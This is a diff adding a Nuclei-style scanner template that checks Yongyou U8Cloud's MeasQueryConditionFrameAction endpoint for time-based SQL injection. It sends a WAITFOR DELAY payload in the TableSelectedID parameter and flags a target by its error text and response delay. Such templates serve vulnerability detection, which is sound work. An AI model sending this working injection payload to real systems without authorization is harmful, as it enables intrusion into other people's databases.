@@ -1,0 +1,29 @@
+id: yongyou-u8cloud-measqueryconditionframeaction-sqli
+info:
+  name: Yongyou U8Cloud MeasQueryConditionFrameAction SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for SQL injection vulnerability in Yongyou U8Cloud's MeasQueryConditionFrameAction.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "错误提示 - iUFO"
+        part: body
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
